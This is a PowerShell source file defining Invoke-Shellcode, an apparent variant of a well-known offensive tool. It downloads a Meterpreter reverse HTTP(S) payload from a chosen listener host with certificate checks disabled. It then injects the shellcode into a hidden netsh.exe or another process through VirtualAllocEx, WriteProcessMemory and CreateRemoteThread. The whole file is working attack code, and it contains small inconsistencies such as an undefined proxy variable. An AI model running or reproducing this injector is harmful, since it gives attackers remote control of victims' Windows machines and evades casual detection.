function Invoke-Shellcode
{


[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateSet( 'windows/meterpreter/reverse_http',
                  'windows/meterpreter/reverse_https',
                  IgnoreCase = $True )]
    [String]
    $Payload = 'windows/meterpreter/reverse_http',
    
    [Parameter( ParameterSetName = 'ListPayloads' )]
    [Switch]
    $ListMetasploitPayloads,
    
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateNotNullOrEmpty()]
    [String]
    $Lhost = '127.0.0.1',
    
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateRange( 1,65535 )]
    [Int]
    $Lport = 8443,
    
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [String]
    $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent',

    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [Switch]
    $Legacy = $False,

    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [Switch]
    $Proxy = $False,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0
    
    
    if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
    {
        $AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes |
            Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
    
        foreach ($Payload in $AvailablePayloads.ValidValues)
        {
            New-Object PSObject -Property @{ Payloads = $Payload }
        }
        
        Return
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        
        
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    } else {
                $pst = New-Object System.Diagnostics.ProcessStartInfo
            $pst.WindowStyle = 'Hidden'
            $pst.UseShellExecute = $False
            $pst.CreateNoWindow = $True
            if ($env:PROCESSOR_ARCHITECTURE -eq "x86"){
            $pst.FileName = "C:\Windows\System32\netsh.exe"
            } else {
            $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
            }
            $Process = [System.Diagnostics.Process]::Start($pst)
            [UInt16]$NewProcID = ($Process.Id).tostring()
            $ProcessID = $NewProcID
            $PSBoundParameters['ProcessID'] = $NewProcID
             Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      
            $CallStub += ConvertTo-LittleEndian $BaseAddr       
            $CallStub += 0xFF,0xD0                              
            $CallStub += 0x6A,0x00                              
            $CallStub += 0x48,0xB8                              
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr 
            $CallStub += 0xFF,0xD0                              
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           
            $CallStub += ConvertTo-LittleEndian $BaseAddr       
            $CallStub += 0xFF,0xD0                              
            $CallStub += 0x6A,0x00                              
            $CallStub += 0xB8                                   
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr 
            $CallStub += 0xFF,0xD0                              
        }
        
        Write-Output $CallStub
    }

    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) 
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ($64bitCPU) 
        {
            
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            
            
            
            
            
            if ($IsWow64) 
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }
                
                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else 
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }
                
                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else 
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) 
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) 
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

        
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }
            
            $Shellcode = $Shellcode64
            Write-Verbose 'Using 64-bit shellcode.'
        }
    
        
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) 
        if (!$BaseAddress)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

        
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
        
        
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) 
        if (!$CallStubAddress)
        {
            Throw "Unable to allocate thread call stub."
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"

        
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null 
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null 

        Write-Verbose 'Shellcode injection complete!'
    }

    
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
    if ($IsWow64ProcessAddr)
    {
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        
        $64bitCPU = $true
    }
    else
    {
        $64bitCPU = $false
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
    {        
        $Response = $True
        
        if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
               "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
        
        if ( !$Response )
        {
            
            Return
        }
        
        switch ($Payload)
        {
            'windows/meterpreter/reverse_http'
            {
                $SSL = ''
            }
            
            'windows/meterpreter/reverse_https'
            {
                $SSL = 's'
                
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$True}
            }
        }
        
        if ($Legacy) 
        {
            
            $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
            Write-Verbose "Requesting meterpreter payload from $Request"
        } else {

            
            $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {[Char]$_}
            $SumTest = $False

            while ($SumTest -eq $False) 
            {
                $GeneratedUri = $CharArray | Get-Random -Count 4
                $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
            }

            $RequestUri = -join $GeneratedUri

            $Request = "http$($SSL)://$($Lhost):$($Lport)/$($RequestUri)" 
        }
           
        $Uri = New-Object Uri($Request)
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add('user-agent', "$UserAgent")
        
        if ($Proxy)
        {
            $WebProxyObject = New-Object System.Net.WebProxy
            $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
            
            
            if ($ProxyAddress) 
            {
            
                $WebProxyObject.Address = $ProxyAddress
                $WebProxyObject.UseDefaultCredentials = $True
                $WebClientObject.Proxy = $WebProxyObject
            }
        }

        try
        {
            [Byte[]] $Shellcode32 = $WebClient.DownloadData($Uri)
        }
        catch
        {
            Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
        }
        [Byte[]] $Shellcode64 = $Shellcode32

    }
    elseif ($PSBoundParameters['Shellcode'])
    {
        
        
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose "Injecting shellcode into PID: $ProcessId"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }
    else
    {
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose "Injecting shellcode into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode into the running PowerShell process!" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }   
}